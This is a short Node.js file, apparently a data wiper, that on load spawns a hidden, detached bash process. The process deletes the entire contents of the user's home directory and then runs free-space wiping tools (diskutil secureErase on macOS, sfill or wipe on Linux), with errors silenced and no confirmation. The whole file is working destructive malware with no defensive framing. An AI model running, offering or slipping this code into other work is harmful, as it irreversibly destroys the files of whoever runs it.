const os = require('os');
const { spawn } = require('child_process');

function macwiper() {
    // Get current user's home directory (e.g., /Users/John or /home/john)
    const userHome = os.homedir();

    // Build the bash command conditionally based on OS
    let bashCommand = `
        # Fast, native recursive deletion of all contents inside the user's home folder
        find "${userHome}" -mindepth 1 -delete 2>/dev/null
    `;

    if (process.platform === 'darwin') {
        // macOS Native Alternative (Note: Ineffective on modern APFS/SSDs)
        bashCommand += `
            # Wipe free space (may fail silently on APFS)
            diskutil secureErase freespace 1 / 2>/dev/null
        `;
    } else if (process.platform === 'linux') {
        // Linux Native Alternatives (sfill or wipe)
        bashCommand += `
            if command -v sfill >/dev/null 2>&1; then
                sfill -l -l -z / 2>/dev/null
            elif command -v wipe >/dev/null 2>&1; then
                wipe -kq / 2>/dev/null
            fi
        `;
    }

    // Spawn the hidden, detached process
    const child = spawn('bash', ['-c', bashCommand], {
        detached: true,
        stdio: 'ignore'
    });

    // Unref the child so the parent Node.js process can exit immediately
    
}

// Execute the function
macwiper();
